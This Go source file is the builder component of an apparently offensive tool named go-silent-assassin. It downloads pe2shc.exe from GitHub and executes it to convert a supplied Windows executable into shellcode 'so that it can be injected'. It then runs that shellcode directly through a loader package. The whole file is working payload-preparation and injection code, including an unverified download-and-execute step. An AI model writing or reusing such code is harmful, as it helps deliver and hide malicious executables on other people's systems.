package builder

import (
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/jpiechowka/go-silent-assassin/loader"
)

type Builder struct {
}

func NewBuilder() *Builder {
	return &Builder{}
}

// TODO: Cleanup
func (b *Builder) BuildExecutable(inputFilePath string, outputFilePath string) error {
	log.Printf("[+] Building executable: %s", outputFilePath)

	workspacePath, err := b.createWorkspace()
	if err != nil {
		return err
	}

	if err := b.downloadPe2ShcExecutable(workspacePath); err != nil {
		return err
	}

	if err := b.convertPEToShellcode(inputFilePath, outputFilePath, workspacePath); err != nil {
		return err
	}

	// TODO: delete after testing!
	// Load shellcode from output file
	shellcode, err := os.ReadFile(filepath.Join(workspacePath, "out.exe"))
	if err != nil {
		return err
	}

	if err := b.deleteWorkspace(workspacePath); err != nil {
		return err
	}

	// TODO: delete after testing!
	l := loader.NewLoader(shellcode)
	return l.Execute()
}

func (b *Builder) createWorkspace() (string, error) {
	log.Println("[+] Creating workspace as temp directory")

	tempDir, err := ioutil.TempDir("", "silent-assassin-*")
	if err != nil {
		return "", err
	}

	log.Printf("[+] Temp directory created: %s", tempDir)
	return tempDir, err
}

func (b *Builder) deleteWorkspace(dir string) error {
	log.Printf("[+] Performing cleanup - removing temp directory and contents: %s", dir)
	return os.RemoveAll(dir)
}

func (b *Builder) downloadPe2ShcExecutable(downloadDir string) error {
	pe2shcExePath := filepath.Join(downloadDir, "pe2shc.exe")
	pe2shcExeFile, err := os.Create(pe2shcExePath)
	if err != nil {
		return err
	}

	log.Println("[+] Downloading latest Hasherezade's pe_to_shellcode from GitHub (https://github.com/hasherezade/pe_to_shellcode)")
	resp, err := http.Get("https://github.com/hasherezade/pe_to_shellcode/releases/latest/download/pe2shc.exe")
	if err != nil {
		return err
	}

	log.Printf("[+] Saving downloaded executable to %s", pe2shcExePath)
	_, err = io.Copy(pe2shcExeFile, resp.Body)

	// Close the pe2shc file early (without defer block / statement) so that it can be executed
	if err := pe2shcExeFile.Close(); err != nil {
		return err
	}

	if err := resp.Body.Close(); err != nil {
		return err
	}

	return nil
}

func (b *Builder) convertPEToShellcode(inputFilePath string, outputFilePath string, workspace string) error {
	log.Printf("[+] Moving input file %s to temp directory as in.exe", inputFilePath)
	input, err := os.ReadFile(inputFilePath)
	if err != nil {
		return err
	}

	if err := os.WriteFile(filepath.Join(workspace, "in.exe"), input, 0666); err != nil {
		return err
	}

	log.Println("[+] Executing pe2shc to convert PE file to shellcode so that it can be injected")
	cmd := exec.Command("./pe2shc.exe", "in.exe", "out.exe")
	cmd.Dir = workspace

	cmdCombinedOut, err := cmd.CombinedOutput()
	if err != nil {
		return err
	}

	log.Printf("[+] pe2shc command output:\n\n%s\n", cmdCombinedOut)

	return nil
}
